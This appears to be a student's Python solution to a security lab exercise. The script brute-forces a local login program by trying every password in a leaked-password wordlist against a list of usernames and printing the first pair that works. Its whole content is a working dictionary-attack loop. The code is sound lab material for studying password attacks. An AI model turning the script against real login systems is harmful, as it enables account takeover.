import time
import subprocess

start = time.time()
print("Start time: 0 seconds")

gang_file_path = "/home/cse/Lab1/Q3/gang"
password_file_path = "/home/cse/Lab1/Q3/PwnedPWs100k"
login_script_path = "/home/cse/Lab1/Q3/Login.pyc"

with open(gang_file_path, "r") as file:
    usernames = {line.strip() for line in file}

found_users = {"SkyRedFalcon914", "MountainPurpleShark585", "MountainBlueFalcon157", "SkySilverWolf337", "SkySilverWolf162"}
remaining_users = usernames - found_users

with open(password_file_path, "r") as file:
    passwords = [line.strip() for line in file]

endloop = False     
for username in remaining_users:
    for password in passwords:
        result = subprocess.run(["python3", login_script_path, username, password], capture_output=True, text=True)

        if "successful" in result.stdout:
            print(f"Username: {username}, Password: {password}")
            endloop = True  
            break  
    if endloop:
        break  

end = time.time() - start
print(f"End Time: {end:.2f} seconds")
